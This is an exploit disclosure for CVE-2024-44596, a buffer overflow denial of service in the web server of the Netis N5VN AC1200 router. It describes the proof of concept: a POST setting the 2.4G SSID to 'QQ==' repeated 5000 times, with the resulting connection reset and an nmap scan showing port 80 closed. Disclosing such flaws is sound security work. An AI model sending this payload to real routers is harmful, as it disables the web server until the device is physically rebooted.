## Exploit Title: Netis N5VN AC1200 - Buffer Overflow DOS (Denial of Service)

- Date: 05/03/2024

- Exploit Author: Van Lam Nguyen

- Facebook: fb.com/vanlam1412

- Vendor Homepage: [Netis Systems](https://www.netis-systems.com/)

- Version: Netis N5VN AC1200 V1.0.1.1742

- Tested on: Windows

- CVE : CVE-2024-44596

## Overview

- There exist a buffer overflow vulnerability in Netis N5VN AC1200 router that can allow an attacker to crash the web server running on the router by sending a crafted request

- To bring back the http (webserver), a user must physically reboot the route.

## Proof of Concept (Use python)

- POST request to change ssid Wireless 2.4G ('ssid': 'QQ==' \* 5000)

- Successfully: ('Connection aborted.', ConnectionResetError(10054, 'An existing connection was forcibly closed by the remote host', None, 10054, None))

- nmap 192.168.1.254 -p 80 80/tcp closed http

[Watch the video demonstration here](https://youtu.be/WvplWEa3XhU?si=r1BJhyBbHiKtsukQ)

![](https://www8.0zz0.com/2024/08/17/10/168879336.png)

![](https://down-vn.img.susercontent.com/file/vn-11134207-7qukw-lhrie7lcjrgh2b)
